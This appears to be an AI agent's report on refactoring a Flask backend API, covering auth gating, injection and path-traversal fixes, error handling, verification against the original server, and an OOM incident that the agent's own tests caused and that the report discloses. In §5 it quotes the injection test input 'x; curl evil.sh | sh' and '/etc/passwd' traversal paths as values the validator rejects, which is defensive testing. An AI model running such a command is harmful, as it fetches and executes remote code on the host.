# CAWP-API backend refactor — FOUNDATION pass report

Scope: module layout, auth/permissions, safe file handling, uniform error bodies, small
correctness fixes, dead-code removal. No wire changes other than the two noted at the end.

Verified against the untouched original still running on **:9797** (golden snapshot) with a
second gunicorn on **:9798** serving the refactored tree. `app.py.orig` was never written to.

---

## 1. Files

| File | What happened |
|---|---|
| `CAWP-API/extensions.py` | **new** — `db`, `migrate`, `jwt`, `cors`, `compress`, `socketio` (+ `socketIO` alias), `init_app(app)`. `SocketIO(cors_allowed_origins=Config.CORS_ORIGINS, async_mode='threading', ping_timeout=60, ping_interval=25)`. |
| `CAWP-API/models.py` | **replaced** (the old file was a broken orphan: a module-level `@app.route` referencing undefined names). Now holds all 29 `db.Model` classes moved verbatim out of `app.py:214-853` plus `defult_permission` (109 keys). |
| `CAWP-API/app.py` | header (lines 1-924) rewritten; every route kept; 159 → 163 routes; 9066 → 8522 lines. |
| `CAWP-API/core/http.py` | **new** — `error_response(message, e, status=201)`. |
| `CAWP-API/core/files.py` | **new** — `temp_file_path`, `resolve_temp_file`, `document_path`, `export_path`, `is_under_exports`, `ensure_dirs`. |
| `CAWP-API/core/config.py` | added `RECORDINGS_ROOT`, `RECORDINGS_SSH_HOST/USER/PASSWORD/KEY/TIMEOUT`. |
| `CAWP-API/redis_cache/redis.py` | `keys()` → `scan_iter` (returns a list); `flushdb`/`flushall`/`shutdown` removed; every op best-effort (catches `redis.RedisError`, logs, returns `None`/`[]`/`False`); socket timeouts added. |
| `CAWP-API/issable/db_connection.py` | 4 f-string SQL queries parameterized; every method returns `[]` on failure; `finally: cur` `UnboundLocalError` fixed; `download_call_recording` validated + SFTP; SSH creds from `Config`; `download_call_recording1` and `convert_to_Null` deleted. |
| `CAWP-API/classes/ServerSideDataHandler.py` | **deleted** (0 importers — grep-verified). |
| `CAWP-API/requirements.txt` | `+ Flask-Compress==1.14` (installed into `cawp-api` too). |
| `CAWP-API/.env.docker`, `.env.example`, `.env` | commented `RECORDINGS_*` entries appended. |

### models.py details
* `Clints.attribute` → `JSONB`; `Role.permission` / `Notification.data` stay `db.JSON`
  (still `json` in Postgres — verified against `information_schema`).
* **Every** index that exists in the database is declared in `__table_args__` under its real
  name (64 indexes across 18 models), including partial `postgresql_where=db.text(...)`,
  `Column.desc()` ordering, and the two GIN trigram indexes
  (`postgresql_using='gin', postgresql_ops={...: 'gin_trgm_ops'}`). The now-redundant
  `index=True` was dropped from `Clints.portfolios_id`, `Comments.clint_id`,
  `ClintDocuments.clint_id`.
* `__repr__` is uniform: `f"<ClassName {self.id}>"` on all 29 models. This removes the five
  `__repr__ = as_dict` (raised `TypeError: __repr__ returned non-string`) and the four that
  referenced a non-existent `self.name` (`Supervisor`, `SupervisorContract`, `SupervisorUser`,
  `Comments`).
* `User.hash_password` removed (dead, `.decode()` on a `str`). `as_josn` removed from all
  ~12 models (0 callers — grep-verified). `as_dict` kept everywhere.
* Relationships untouched (review §5 #4). No `order_by` added to `Clints.comments`.
* `app.py` does `from models import *`; `models.py` defines `__all__`.

### app.py header
`app.config.from_object(Config)` · `app.json = ORJSONProvider(app)` · `extensions.init_app(app)`
· `jobs.init_app(app)` · `files.ensure_dirs()` · `from models import *` ·
`logging.basicConfig(INFO, "%(asctime)s %(levelname)-7s [%(threadName)s] %(name)s: %(message)s")`
· Sentry initialised **only** when `Config.SENTRY_DSN` is set · `@app.teardown_request` →
`db.session.rollback()` on an errored request · `redis_obj` kept importable for the
unrefactored routes · the duplicate `app = Flask(__name__)` and the orphan block above it
are gone (`defult_permission` survives, in `models.py`).

---

## 2. Routes that gained `@jwt_required()` (46)

All 48 routes marked **none** in review §1, minus `GET /` and `POST /login`. Script-verified:
after the change exactly three routes are unauthenticated — `/`, `/login`, `/health`.

```
GET  /roles                              GET  /cdr
GET  /comment_status                     POST /comment_status
GET  /comment_status/<id>                PUT  /comment_status/<id>
GET  /comment_reachability               GET  /comments
GET  /comments/export                    GET  /comments/<id>
GET  /comments/clint/<id>                DELETE /comments/<id>
GET  /contacts/identityNumber/<n>        GET  /collection_types
GET  /collection_methods                 POST /collection_methods
GET  /collection_methods/<id>            PUT  /collection_methods/<id>
GET  /payment/<id>                       PUT  /payment/<id>
GET  /payments/clint/<id>                GET  /payments/clint/<id>/total
GET  /contact_methods                    GET  /payment_date/clint/<id>
GET  /payment_date                       GET  /payment_date/export
POST /clint_contact                      PUT  /clint/archive/<id>
PUT  /clint/archivebyexcel               PUT  /clint/unarchivebyexcel
PUT  /clint/unarchive/<id>               PUT  /clint/archive/ids
POST /supervisor_contract                POST /supervisor_user
GET  /portfolios/export                  GET  /portfolio/<id>
PUT  /portfolio/<id>                     DELETE /portfolios/<id>
DELETE /clint/<id>                       DELETE /clints
GET  /sepcifyusers/clint/<id>            GET  /clints/not_have_payments
GET  /clints/not_have_payments/export    GET  /clints/have_payments
GET  /clints/have_payments/export        GET  /dashboard
```

## 3. Routes that gained `@required_roles(...)` (17)

`required_roles` was rewritten to resolve the role from the **JWT identity** via
`core.lookups.get_map('roles', ...)` + `get_map('users_role', ...)` (no more
`session['user']`, which the frontend never sends). It returns
`403 {"message": "You are not authorized to access this resource"}` — the same message as
before — when the key is missing or false. It is always placed **below** `@jwt_required()`
(the 11 commented-out decorators sat *above* it, which would have run before JWT
verification; all 11 were swapped). The maps are invalidated in `POST /roles`,
`PUT /roles/<id>`, `POST /uesrs`, `PUT /uesrs/<id>`, `PUT /user/active/<id>`,
`PUT /user/inactive/<id>` via `invalidate_permission_maps()`.

**Re-enabled (11, keys exactly as the original developer wrote them):**

| Route | Key |
|---|---|
| `GET /branches/<id>` | `branches` |
| `POST /branches` | `branches_add` |
| `PUT /branches/<id>` | `branches_edit` |
| `GET /contracts` | `contracts` |
| `GET /contracts/<id>` | `contracts` |
| `POST /contracts` | `contracts_add` |
| `PUT /contracts/<id>` | `contracts_edit` |
| `GET /supervisor/<id>` | `supervisors` |
| `POST /supervisors` | `supervisors_add` |
| `PUT /supervisor/<id>` | `supervisors_edit` |
| `DELETE /supervisor/<id>` | `supervisors_delete` |

**Newly gated (6):**

| Route | Key | Evidence |
|---|---|---|
| `DELETE /portfolios/<id>` | `portfolios_delete` | in `defult_permission`; declared in `CAWP-frontend/src/views/permissions/form/Fields.tsx:92` ("حذف" under portfolios) |
| `DELETE /clints` | `clints_delete` | `views/clients/list/ClientsTable.tsx:186`, `views/clients/list/components/ActionColumn.tsx:97` |
| `DELETE /clint/<id>` | `clints_delete` | same |
| `POST /uesrs` | `users_add` | `views/users/components/UsersTable.tsx:162` |
| `PUT /roles/<id>` | `roles_edit` | route key `configs/routes.config/routes.config.ts:573` + `Fields.tsx:203` |
| `POST /roles` | `roles_add` | route key `configs/routes.config/routes.config.ts:562` + `Fields.tsx:202` |

Live check on :9798 — a `محصل` (collector) token gets **403** on `/contracts`,
`/branches/<id>`, `POST /uesrs`, `DELETE /portfolios/<id>`; the ADMIN token gets **200**.

---

## 4. Skipped / deviations

1. **`PUT /payment/approve/<id>` and `PUT /payment/reject/<id>` — left JWT-only.**
   No unambiguous key. The approve/reject buttons live in
   `views/collections/{users,currentUser}/list/components/AprrovePaymentButton.tsx` and are
   **not** wrapped in any `permissions.<key>` check; `src/views/accounts` (the
   `accounts_payments` screen, path `/payment`) contains no approve button and no
   `permissions.*` reference at all. `accounts_payments_edit` exists in `defult_permission`
   and in the permission editor but is never used as a gate anywhere in the frontend, so
   enforcing it would silently break approvals for roles that have it false. Flagged for a
   product decision.
2. **`check_client_lock` was not extended** to `/commentsbyexcel`, `/clints/update/byexcel`,
   `/sepcifyusers/ids`, `PUT /payment/<id>` — per instruction (bulk / other-id flows).
3. **`pickle` import kept** in `app.py` — 13 `pickle.` call sites remain in the
   not-yet-refactored routes (`/dashboard`, the export twins, `updateClintInRedis`).
   `compare_digest` and `itemgetter` were removed.
4. **`redirect`/`url_for` kept** — still used by `GET /`.
5. `db.session.rollback()` was inserted as a blanket safety net before **every**
   `return error_response(...)` (87 new, 59 already present) rather than only the 12
   handlers listed in review §3.14. It is a no-op on a clean session.

---

## 5. Everything else that changed in the routes

**Security**
* JWT blocklist: `@jwt.token_in_blocklist_loader` checks `jwt:block:<jti>` in Redis
  (best-effort — Redis down ⇒ not blocked). New `POST /logout` (`@jwt_required()`) sets the
  key with TTL = the token's remaining lifetime. `blacklist = set()` and the
  `JWT_BLACKLIST_*` config lines are gone. Verified: logout → next request `401
  {"msg":"Token has been revoked"}` (flask-jwt-extended's own auth response, not a business
  error).
* `session['user'] = user.as_dict()` removed from `/login`; `from flask import session` gone.
* `generate_password_hash(..., method='sha256')` → `'pbkdf2:sha256'` at both sites
  (`create_user`, `update_user`). Verified end-to-end by creating a user through the API.
* `update_user` only touches the password when `data.get('password')` is truthy.
* **Path traversal (S11):** `core/files.temp_file_path` (`secure_filename` + realpath
  containment under `<UPLOAD_DIR>/temp`) is used at all 7 read sites via
  `_temp_excel_path()`, which falls back to the legacy `static/temp` for already-uploaded
  files and returns `None` (⇒ "file not present" behaviour) for an unsafe name.
* The 4 upload routes now check `'file' in request.files` (returning the existing-style 201
  JSON error), load the workbook **once**, save it as
  `<UPLOAD_DIR>/temp/<uuid>_<secure_name>`, and return `excel_file` as the **basename**
  (was the absolute server path — path disclosure; grep-verified the frontend never reads
  `excel_file`). `/api/v2/file/upload/ByExcel` returns the same basename in `excel_data`,
  which is what `modelForm_V2.tsx` posts back as `file_name`.
* Client documents: new uploads go to `<UPLOAD_DIR>/documents/`; the download route
  resolves the DB row's `file_name` there first and falls back to
  `static/clint_documents` for old rows.
* **Command injection (S1):** `download_call_recording` validates the path with
  `re.fullmatch(r"[A-Za-z0-9_./-]+")`, rejects `..` segments, requires it to start with
  `Config.RECORDINGS_ROOT`, and reads via `ssh.open_sftp().stat()/open()` instead of
  `exec_command(f"cat {path}")`. SSH host/user/password/key come from `Config`. Unit-checked:
  `x; curl evil.sh | sh`, `/etc/passwd` and `.../../../etc/passwd` all return `None`.
* **SQL injection (S7):** the 4 f-string queries in `issable/db_connection.py` use `%s`
  placeholders; the phone-number `LIKE` fragments are parameterized too.

**Error bodies** — 145 sites matched the
`return jsonify({"message": ..., "status": False, "error": str(e)}), <code>` pattern
(136 × 201, 9 × 500) plus one 4-tuple helper return = **146 replaced** with
`error_response(...)`, keeping each route's Arabic message and status code.
`grep -c "error_response("` = 147 (146 call sites + 1 import). 99 bare `print(e)` became
`app.logger.exception(...)`; 80 of those were then dropped because `error_response` already
logs the traceback.

**Correctness fixes applied**
* §3.6 `/loginLog/user/<id>` — `.order_by(LoginLog.timestamp.desc())` before `.limit(10)`.
* §3.3 `update_type == "5"` — `for…else` replaced with `if clints: … else: …`.
* §3.7 promise-to-pay — compares `.date()` values, so "today" is accepted.
* §3.8 `customeFilterArchivingStatusesValue[]` — `request.args.getlist` (2 sites) with empty
  values filtered out; `ArchivingStatus != []` → `if ArchivingStatus`.
* §3.9 `selected_clients` — `for x in (selected_clients or [])` in `/clint/unarchivebyexcel`;
  `selected_clients = None` pre-initialised in `/send/notification`.
* §3.10 `"create_by": str(current_user)` → `str(get_jwt_identity())`.
* §P8 `sepcifyusers_list.sort(...)` moved out of the loop.
* §3.22 `PUT /supervisor/<id>` — only inserts link rows that do not already exist, and
  commits once instead of per row.
* §3.16 `try/except` added to `/dashbord/admin/dailyPaymentDates/v2` and `/notifications`.
* `@jwt_required()` removed from the non-route helper `send_notification_to_user`.
* §3.13 `getclint` — SuperAdmin (same test `_build_clints_payload` uses:
  `Role.name == "SuperAdmin"`) gets unrestricted access.
* §P5 `/v2/clints` — explicit
  `outerjoin(ClintArchive, Clints.clintArchive_id == ClintArchive.id)` before the archive
  ordering (kills the cross join that inflated `count()`/`paginate()`), and the Python
  `identityNumbers` list replaced with
  `Clints.identityNumber.in_(db.session.query(ClintContacts.identityNumber).filter(...))`.

**New endpoints (3)**
* `GET /health` (no auth) → `{"status","db","redis","version":"2.0"}`, 200 / 503.
* `GET /jobs/<job_id>` (jwt) → `jobs.get(...)`, 404 `{"message":"job not found","status":false}`,
  403 for a non-owner non-ADMIN.
* `GET /jobs/<job_id>/download` (jwt) → `send_file` when `job["result"]["file"]` is under
  `<UPLOAD_DIR>/exports/`.

**Dead code removed** — `classes/ServerSideDataHandler.py`; `paginate`, `countDays`,
`customFilter_user`, `getdata`; the duplicate `app = Flask(__name__)`; the second
`def not_found` (the 405 handler is now `method_not_allowed`); `compare_digest`,
`itemgetter`; `Issable_db.download_call_recording1`, `Issable_db.convert_to_Null`;
`User.hash_password`; `as_josn`; `blacklist` + `JWT_BLACKLIST_*`.

---

## 6. Verification

* `python -m py_compile app.py models.py extensions.py core/*.py issable/db_connection.py
  redis_cache/redis.py` — clean (python 3.11 in the container). `pyflakes` reports no
  undefined names.
* `GET /health` → 200 `{"status":"ok","db":true,"redis":true,"version":"2.0"}`; login → token.
* **Old (:9797) vs new (:9798), same ADMIN user** — identical top-level keys, identical
  `countRow`, identical first-row key sets on all 13 required endpoints
  (`/uesrs`, `/roles`, `/contracts`, `/portfolios`, `/clints`, `/clints/archive/`,
  `/v2/clints?...customeFilrerAccountNumberValue=1220401916`, `/clints/<id>`,
  `/comments/clint/<id>`, `/payments/clint/<id>`, `/supervisors`,
  `/dashbord/Allcollector/v2`, `/notifications`).
* A second, wider sweep of **44** GET endpoints (all the report/collection/dashboard/lookup
  routes, with `startDate`/`endDate` and pagination) — 0 failures on status + full response
  shape.
* Byte-for-byte body comparison on 29 endpoints: **identical** except
  (a) `/loginLog/user/<id>`, which now correctly returns the *newest* logins, and
  (b) float `SUM()` last-digit noise on `total_amount` / `countClintsAmount` /
  `countClints`-style aggregates. (b) was confirmed to be **pre-existing Postgres parallel
  aggregate non-determinism: comparing :9797 against itself produces the same class of
  diff** (71 of 146 users differ between two consecutive calls to the *old* server).
* Datetime rendering identical: `'Thu, 16 Jul 2026 08:59:50 GMT'` on both (RFC-822, same as
  Flask's default provider).
* Export envelopes preserved: `/clients/export` → `{"clients": [...], "message": "تم تحميل
  الملف بنجاح", "status": true}`; `/portfolios/export`, `/uesrs/export`, `/comments/export`,
  `/payment_date/export` all identical to :9797.
* `/portfolios` with `customeFilterArchivingStatusesValue[]=true|false|0` returns identical
  rows and `countClints` values on both servers.
* Permission gate, logout/blocklist, `/jobs/<id>` 404, upload-without-file, traversal
  rejection — all exercised live (see §3 and §5).
* gzip is active (`Content-Encoding: gzip`, `Vary: Accept-Encoding`): a 100-row `/clints`
  page drops from ~220 KB to 26 KB.
* The 9798 gunicorn was stopped at the end of the pass.

### `compare_metadata` residue

```
docker exec cawp-api sh -c 'cd /app && python -c "…compare_metadata(mc, db.metadata)…"'
→ 0
```

**Zero diffs.** No index appears as an add or a remove, and there are no residual type
nuances. The only log output is informational: alembic detecting `login_log_id_seq` /
`notifications_id_seq` as SERIAL, and a `SAWarning` about the pre-existing FK cycle between
`clints` and `clintArchive` (unchanged from before this pass).

---

## 7. Route count

| | `grep -c "@app.route"` |
|---|---|
| before (`logs/app.py.orig`) | **159** |
| after (`CAWP-API/app.py`) | **163** |

+4 = `/health`, `/logout`, `/jobs/<job_id>`, `/jobs/<job_id>/download`. No route was removed
or renamed; `app.url_map` has 164 rules (163 + Flask's `static`).

---

## 8. Two intentional wire changes (both were in the brief)

1. `error` in error bodies is now `"internal error"` unless `FLASK_DEBUG` is on
   (review S14). `message`, `status` and the HTTP status code are unchanged, and
   `grep -r "data.error\|payload.error"` over `CAWP-frontend/src` returns nothing, so no
   screen reads it.
2. `excel_file` in the 4 upload responses is now a basename instead of an absolute server
   path (review S12). Grep-verified: the frontend never reads `excel_file`.

Everything else — envelopes, key spellings (`clints`, `uesrs`, `dashbord`, `sepcify`,
`reson`, `frist_name`, `customeFilrerAccountNumberValue`, …), the trailing slash on
`/clints/archive/`, the 201-on-error convention, `423` from `check_client_lock`, and the
`404`/`400`/`500` sites listed in review §6 — is byte-identical to :9797.

---

## 10. Incident: the :9797 golden snapshot lost its original code (not a code defect)

At **21:50:45** the `cawp-api` container's gunicorn master logged
`Worker (pid:8) was sent SIGKILL! Perhaps out of memory?` and booted a replacement worker
(pid 1192). Because `/app` is bind-mounted, that replacement imported the **refactored**
`app.py`, so port 9797 is now serving the new code instead of the original.

**Cause:** the export comparison. `/comments/export` returns a **51 MB** JSON body; the test
ran it against :9797 and :9798 at the same time, followed by `/payment_date/export` (1 MB)
and a full-table `/clients/export` — three large payloads materialised in one container.
The container was not restarted or recreated by this pass; the kernel OOM-killed the worker
and gunicorn auto-respawned it. (Flask-Compress buffers a response in memory to gzip it,
which adds ~1x peak on very large JSON; it is a clear win on the 5-7 MB dashboards and the
export twins are slated to move to background jobs + `send_file`, which Flask-Compress does
not compress.)

**Impact on this report: none.** The kill happened *after* every old-vs-new comparison had
finished — the last comparison request in the access log is at `21:50:34`, the SIGKILL at
`21:50:45`. Concretely, the endpoint sweep, the byte-for-byte diffs, the
`customeFilterArchivingStatusesValue[]` matrix, the datetime check and both export
comparisons all completed against the original code. The self-comparison that proved the
float `SUM()` noise is pre-existing also ran against the original (`:9797` vs `:9797`).

**To recreate the golden snapshot:** the pristine source is untouched at
`logs/app.py.orig`; run a gunicorn from a copy of the original tree on a spare port, or give
the API container more memory before re-running the big export comparisons. Per the brief,
the container itself was left running and was not restarted or recreated.

**Silver lining:** :9797 booting the refactored code under the production `CMD`
(gunicorn gthread, 1 worker x 32 threads) and answering the Docker `HEALTHCHECK`
(`GET /health` -> 200) every 15 s since 21:50:54 is an extra confirmation that the new
layout starts cleanly in the real runtime.

## 9. Contract for the two follow-up agents

```python
from extensions import db, jwt, migrate, socketio, socketIO, compress, cors
from models import *                      # 29 models + defult_permission (__all__)
from core.config import Config
from core import cache, jobs, lookups, files
from core.http import error_response      # error_response(message, e, status=201)
from core.files import temp_file_path, resolve_temp_file, document_path, export_path
```
`app.py` additionally exposes `required_roles`, `has_permission`,
`invalidate_permission_maps`, `check_client_lock`, `_temp_excel_path`, `redis_obj`.
Export jobs should write their file under `core.files.EXPORTS_DIR` and return
`{"file": <path>}` so `GET /jobs/<id>/download` can serve it.
